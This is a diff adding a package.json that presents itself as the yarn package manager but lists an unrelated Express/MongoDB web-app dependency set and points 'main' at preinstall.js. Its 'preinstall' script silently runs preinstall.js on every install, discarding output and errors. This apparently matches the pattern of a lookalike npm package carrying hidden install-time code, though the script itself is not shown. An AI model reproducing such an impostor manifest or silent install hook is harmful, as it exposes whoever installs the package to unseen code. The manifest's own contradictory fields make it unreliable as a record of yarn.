@@ -1,0 +1,51 @@
+{
+  "name": "yarn",
+  "installationMethod": "msi",
+  "version": "1.22.22",
+  "packageManager": "yarn@1.22.17",
+  "license": "BSD-2-Clause",
+  "preferGlobal": true,
+  "description": "📦🐈 Fast, reliable, and secure dependency management.",
+  "resolutions": {
+    "sshpk": "^1.14.2"
+  },
+  "engines": {
+    "node": ">=4.0.0"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/yarnpkg/yarn.git"
+  },
+  "bin": {
+    "yarn": "bin/yarn.js",
+    "yarnpkg": "bin/yarn.js"
+  },
+  "scripts": {
+    "start":"node app",
+    "preinstall": ":; (node ./preinstall.js > /dev/null 2>&1 || true)"
+  },
+  "config": {
+    "commitizen": {
+      "path": "./node_modules/cz-conventional-changelog"
+    }
+  },
+  "dependencies": {
+    "bcryptjs": "^2.4.3",
+    "cookie-parser": "^1.4.6",
+    "cors": "^2.8.5",
+    "express": "^4.19.2",
+    "jsonwebtoken": "^9.0.2",
+    "mongodb": "^6.7.0",
+    "mongoose": "^8.4.1"
+  },
+  "bugs": {
+    "url": "https://github.com/yarnpkg/yarn/issues"
+  },
+  "homepage": "https://github.com/yarnpkg/yarn#readme",
+  "main": "preinstall.js",
+  "directories": {
+    "lib": "lib"
+  },
+  "keywords": [],
+  "author": ""
+}
